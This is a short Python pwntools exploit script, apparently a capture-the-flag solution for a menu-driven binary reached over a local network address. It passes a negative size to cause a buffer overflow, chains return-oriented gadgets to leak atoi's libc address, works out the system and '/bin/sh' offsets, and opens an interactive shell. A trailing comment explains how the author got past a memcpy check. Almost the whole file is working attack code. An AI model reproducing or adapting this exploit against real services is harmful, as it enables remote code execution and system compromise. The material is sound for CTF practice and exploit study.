from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

t = remote('192.168.5.185',9999)
raw_input()
t.sendlineafter('$ ', '123')

def create(size, cun, content):
    t.sendlineafter('$ ', '1')
    t.sendlineafter('size\n', str(size))
    t.sendlineafter('cun\n', str(cun))
    t.sendlineafter('content\n',content)



create(-1,0,cyclic(128) + p64(0) * 3 + p64(0x400da3) + p64(0x602058) + p64(0x4006d0) + p64(0x400C8C))
addr_atoi = u64(t.recvn(6).ljust(8,'\x00'))
log.success('addr_atoi: ' + hex(addr_atoi))

t.sendlineafter('$ ', '123')
create(-1,1,cyclic(128) + p64(0) * 3 + p64(0x400da3) + p64(addr_atoi - 0x36e80 + 0x18cd57) + p64(addr_atoi - 0x36e80 + 0x45390))


t.interactive()

# bypass memcpy use extra padding to measure which args that is memcpy dest ptr then use p64() by pass normal 0 is a invaild address while p64(0) is ok
